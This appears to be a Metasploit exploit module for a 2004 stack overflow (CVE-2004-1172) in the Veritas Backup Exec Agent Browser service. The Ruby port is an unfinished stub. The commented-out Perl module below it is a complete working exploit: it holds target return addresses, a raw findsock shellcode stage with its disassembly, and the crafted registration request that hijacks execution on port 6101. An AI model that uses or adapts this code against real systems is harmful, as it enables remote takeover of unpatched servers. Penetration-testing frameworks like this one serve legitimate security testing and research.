require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Veritas Backup Exec Name Service Overflow',
			'Description'    => %q{
				This module exploits a vulnerability in the Veritas Backup
				Exec Agent Browser service. This vulnerability occurs when a
				recv() call has a length value too long for the	destination
				stack buffer. By sending an agent name value of 63 bytes or
				more, we can overwrite the return address of the recv
				function. Since we only have ~60 bytes of contiguous space
				for shellcode, a tiny findsock payload is sent which uses a
				hardcoded IAT address for the recv() function. This payload
				will then roll the stack back to the beginning of the page,
				recv() the real shellcode into it, and jump to it. This
				module has been tested against Veritas 9.1 SP0, 9.1 SP1, and
				8.6.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '12418'],
					[ 'CVE', '2004-1172'],
					[ 'URL', 'http://www.idefense.com/application/poi/display?id=169&type=vulnerabilities'],
					[ 'MIL', '10'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "",
					'MinNops'  => 512,
					'MinNops'  => 512,
					'Prepend'  => "\x81\xc4\x54\xf2\xff\xff",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, win2000, winxp, win2003',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Dec 16 2004',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::backupexec_ns;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'  => 'Veritas Backup Exec Name Service Overflow',
	'Version'  => '$Revision$',
	'Authors' => [ 'Thor Doomen <syscall [at] hushmail.com>' ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winxp', 'win2003' ],
	'Priv'  => 1,

	'AutoOpts'  => { 'EXITFUNC' => 'process' },

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 6101],
	  },

	'Payload' =>
	  {
		'MinNops'	=> 512,
		'MaxNops'	=> 512,
		'Space'     => 1024,
		'BadChars'  => '',
		'Prepend' => "\x81\xc4\x54\xf2\xff\xff",	# add esp, -3500
		'Keys'		=> ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a vulnerability in the Veritas Backup Exec 
		Agent Browser service. This vulnerability occurs when a recv() call 
		has a length value too long for the	destination stack buffer. By 
		sending an agent name value of 63 bytes or more, we can overwrite
		the return address of the recv function. Since we only have ~60 
		bytes of contiguous space for shellcode, a tiny findsock payload 
		is sent which uses a hardcoded IAT address for the recv() function. 
		This payload will then roll the stack back to the beginning of
		the page, recv() the real shellcode into it, and jump to it.
		This module has been tested against Veritas 9.1 SP0, 9.1 SP1, 
		and	8.6.
}),

	'Refs'    =>
	  [
		['OSVDB', '12418'],
		['CVE', '2004-1172'],
		['URL', 'http://www.idefense.com/application/poi/display?id=169&type=vulnerabilities'],
		['MIL', '10'],		
	  ],

	'Targets' =>
	  [	# BackupExec 9.1 SP0/SP1 return contributed by class101
		['Veritas BE 9.1 SP0/SP1',	0x0142ffa1, 0x401150FF], # recv@bnetns.exe v9.1.4691.0 | esi@bnetns.exe
		['Veritas BE 8.5 ',			0x014308b9, 0x401138FF], # recv@bnetns.exe v8.50.3572  | esi@beclass.dll v8.50.3572
	  ],

	'Keys' => ['veritas'],

	'DisclosureDate' => 'Dec 16 2004',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self        = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target      = $self->Targets->[$target_idx];

	$self->PrintLine( "[*] Attempting to exploit " . $target->[0] );

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ( $s->IsError ) {
		$self->PrintLine( '[*] Error creating socket: ' . $s->GetError );
		return;
	}

	my $code = "\xfc" x 112;

  # This will findsock/read the real shellcode (51 bytes, harcoded IAT for recv)
  # The IAT for recv() is for bnetns, the address is shifted by 8 bits to avoid
  # nulls: [0x00401150 -> 0x401150FF]
	my $read =
	  "\x31\xf6\xc1\xec\x0c\xc1\xe4\x0c\x89\xe7\x89\xfb\x6a\x01\x8b\x74".
	  "\x24\xfe\x31\xd2\x52\x42\xc1\xe2\x10\x52\x57\x56\xb8\xff\x50\x11".
	  "\x40\xc1\xe8\x08\xff\x10\x85\xc0\x79\x07\x89\xdc\x4e\x85\xf6\x75".
	  "\xe1\xff\xd7";

	# Configure the IAT for the recv call
	substr($read, 29, 4, pack('V', $target->[2]));

	# Stuff it all into the request...
	substr( $code, 2, length($read), $read );

	# Return address to use (jmp esi)
	substr( $code, 66, 4, pack('V', $target->[1]) );

	# The registration request
	my $req =
	  "\x02\x00\x32\x00\x20\x00" . $code . "\x00".
	  "1.1.1.1.1.1\x00".
	  "\xeb\x81";

	$self->PrintLine( "[*] Sending agent registration request of " . length($req) . " bytes..." );
	$s->Send($req);

	$self->PrintLine( "[*] Sending final payload of " . length($req) . " bytes..." );
	$s->Send($shellcode);

	sleep(2);
	$self->PrintLine("[*] Waiting for a response...");
	return;
}

my $findsock = q{
	00000000  31F6              xor esi,esi
	00000002  C1EC0C            shr esp,0xc
	00000005  C1E40C            shl esp,0xc
	00000008  89E7              mov edi,esp
	0000000A  89FB              mov ebx,edi
	0000000C  6A01              push byte +0x1
	0000000E  8B7424FE          mov esi,[esp-0x2]
	00000012  31D2              xor edx,edx
	00000014  52                push edx
	00000015  42                inc edx
	00000016  C1E210            shl edx,0x10
	00000019  52                push edx
	0000001A  57                push edi
	0000001B  56                push esi
	0000001C  B8FF501140        mov eax,0x401150ff
	00000021  C1E808            shr eax,0x8
	00000024  FF10              call near [eax]
	00000026  85C0              test eax,eax
	00000028  7907              jns 0x31
	0000002A  89DC              mov esp,ebx
	0000002C  4E                dec esi
	0000002D  85F6              test esi,esi
	0000002F  75E1              jnz 0x12
	00000031  FFD7              call edi
};

1;

=end


end
end	
